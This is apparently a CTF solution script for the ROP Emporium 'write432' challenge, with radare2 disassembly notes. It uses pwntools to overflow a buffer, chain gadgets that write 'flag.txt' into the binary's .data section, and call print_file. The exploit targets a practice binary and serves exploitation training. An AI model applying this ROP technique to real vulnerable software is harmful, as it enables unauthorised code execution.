from pwn import *

'''
[0x080483f0]> s loc.usefulGadgets 
[0x08048543]> pd 4 
            ;-- usefulGadgets:
            0x08048543      892f           mov dword [edi], ebp
            0x08048545      c3             ret

  pop_edi_ebp
  0x080485aa                 5f  pop edi
  0x080485ab                 5d  pop ebp
  0x080485ac                 c3  ret


[0x08048543]> s sym.usefulFunction 
[0x0804852a]> pdf
┌ 25: sym.usefulFunction ();
│           0x0804852a      55             push ebp
│           0x0804852b      89e5           mov ebp, esp
│           0x0804852d      83ec08         sub esp, 8
│           0x08048530      83ec0c         sub esp, 0xc
│           0x08048533      68d0850408     push str.nonexistent        ; 0x80485d0 ; "nonexistent"
│           0x08048538      e893feffff     call sym.imp.print_file
│           0x0804853d      83c410         add esp, 0x10
│           0x08048540      90             nop
│           0x08048541      c9             leave
└           0x08048542      c3             ret




[0x08048543]> rabin2 -S write432
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
19  0x00000efc    0x4 0x08049efc    0x4 -rw- .init_array
20  0x00000f00    0x4 0x08049f00    0x4 -rw- .fini_array
21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- .dynamic
22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- .got
23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt
24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss

[0x0804852a]> s sym..plt
[0x080483a0]> pd 20
            ; CODE XREFS from sym._init @ +0x3f, +0x4f, +0x5f
            ;-- section..plt:
            ;-- .plt:
      ┌┌┌─> 0x080483a0      ff3504a00408   push dword [0x804a004]      ; [12] -r-x section size 64 named .plt
      ╎╎╎   0x080483a6      ff2508a00408   jmp dword [0x804a008]
      ╎╎╎   0x080483ac      0000           add byte [eax], al
      ╎╎╎   0x080483ae      0000           add byte [eax], al
      ╎╎╎   ; CALL XREF from main @ 0x8048517
┌ 6: sym.imp.pwnme ();
└     ╎╎╎   0x080483b0      ff250ca00408   jmp dword [reloc.pwnme]     ; 0x804a00c
      ╎╎╎   0x080483b6      6800000000     push 0
      └───< 0x080483bb      e9e0ffffff     jmp sym..plt
       ╎╎   ; CALL XREF from entry0 @ 0x804841d
┌ 6: int sym.imp.__libc_start_main (func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end);
└      ╎╎   0x080483c0      ff2510a00408   jmp dword [reloc.__libc_start_main] ; 0x804a010
       ╎╎   0x080483c6      6808000000     push 8                      ; 8
       └──< 0x080483cb      e9d0ffffff     jmp sym..plt
        ╎   ; CALL XREF from sym.usefulFunction @ 0x8048538
┌ 6: sym.imp.print_file ();
└       ╎   0x080483d0      ff2514a00408   jmp dword [reloc.print_file] ; 0x804a014
        ╎   0x080483d6      6810000000     push 0x10                   ; 16
        └─< 0x080483db      e9c0ffffff     jmp sym..plt
            ; CALL XREF from sym._init @ 0x8048395
            ;-- section..plt.got:


'''
context.binary = elf = ELF('write432')
offset = 44
mov_ptr_edi_ebp = 0x08048543
pop_edi_ebp     = 0x080485aa
print_file      = 0x08048538

where = 0x0804a018 # data
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

payload = b'a'*offset + p32(pop_edi_ebp) + p32(where) + p32(what1) + p32(mov_ptr_edi_ebp) 
payload += p32(pop_edi_ebp) + p32(where+4) + p32(what2) + p32(mov_ptr_edi_ebp)
payload += p32(print_file)+p32(where)

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())



